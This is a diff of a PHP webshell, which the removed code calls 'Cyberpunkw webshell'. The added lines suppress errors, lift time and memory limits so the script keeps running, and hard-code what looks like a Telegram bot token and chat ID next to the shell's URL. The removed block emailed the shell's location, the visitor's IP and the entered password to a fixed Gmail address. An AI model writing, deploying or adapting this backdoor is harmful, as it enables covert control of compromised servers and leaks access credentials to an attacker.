@@ -1,5 +1,12 @@
-<?php         
+<?php     
 session_start();
+ignore_user_abort(true);
+ini_set('memory_limit', '-1');
+set_time_limit(0);
+error_reporting(0);
+ini_set('display_errors', 0);
+ini_set('max_execution_time', 5000);
+// Menggunakan password_hash dan
 $bcripthash = '8390423631:AAE18ENcI5InhKoR0RmW3B2Yyke7VoV7Hqc';
 $angka = '5070938778';
 $xPath = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
@@ -113,12 +120,7 @@ echo '<audio autoplay><source src="https://cvar1984.github.io/audio/moan.mp3" ty
         }
     }
     ?>
-<?php
-$tujuanmail = 'muhrazky@gmail.com, muhrazky@gmail.com';
-$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$pesan_alert = "cek $x_path  *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ] Pass: [ $pass ]";
-mail($tujuanmail, "Cyberpunkw webshell", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
-?>
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
